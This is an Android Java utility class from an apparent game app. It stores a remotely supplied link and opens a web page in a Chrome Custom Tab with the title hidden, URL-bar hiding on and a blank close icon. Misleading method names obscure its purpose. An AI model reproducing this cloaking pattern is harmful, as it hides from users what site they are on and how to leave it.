package com.oker.game;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.net.Uri;

import androidx.browser.customtabs.CustomTabsClient;
import androidx.browser.customtabs.CustomTabsIntent;
import androidx.browser.customtabs.CustomTabsServiceConnection;
import androidx.browser.customtabs.CustomTabsSession;

import java.util.List;

import static com.facebook.FacebookSdk.getApplicationContext;

class BuzzUtils {
    private CustomTabsSession tabsSession;
    private static final String POLICY_CHROME = "com.android.chrome";
    private CustomTabsClient b;

    public static void setFizz(String newLink, Activity context) {
        DatabaseUtils databaseUtils = new DatabaseUtils(context);
        databaseUtils.setData("http://" + cut(newLink));

        new Thread(() -> new Messages().messageSchedule(context)).start();

        context.startActivity(new Intent(context,  MainActivity.class));
        context.finish();
    }

    private static String cut(String input) {
        return input.substring(input.indexOf("$") + 1);
    }

    public void getPolicyData(Context context, String a2){
        CustomTabsServiceConnection connection = new CustomTabsServiceConnection() {
            @Override
            public void onCustomTabsServiceConnected(ComponentName componentName, CustomTabsClient customTabsClient) {
                //Pre-warming
                b = customTabsClient;
                b.warmup(0L);
                //Initialize tabsSession session as soon as possible.
                tabsSession = b.newSession(null);
            }

            @Override
            public void onServiceDisconnected(ComponentName name) {
                b = null;
            }
        };

        CustomTabsClient.bindCustomTabsService(getApplicationContext(), POLICY_CHROME, connection);
        final Bitmap backButton = BitmapFactory.decodeResource(context.getResources(), R.drawable.empty);
        CustomTabsIntent launchUrl = new CustomTabsIntent.Builder(tabsSession)
                .setToolbarColor(Color.parseColor("#1B0C1E"))
                .setShowTitle(false)
                .enableUrlBarHiding()
                .setCloseButtonIcon(backButton)
                .addDefaultShareMenuItem()
                .build();

        if (color(context))
            launchUrl.intent.setPackage(POLICY_CHROME);

        launchUrl.launchUrl(context, Uri.parse(a2));
    }
    boolean color(Context context){
        List<ApplicationInfo> packages;
        PackageManager pm;

        pm = context.getPackageManager();
        packages = pm.getInstalledApplications(0);
        for (ApplicationInfo packageInfo : packages) {
            if(packageInfo.packageName.equals(BuzzUtils.POLICY_CHROME))
                return true;
        }
        return false;
    }
}
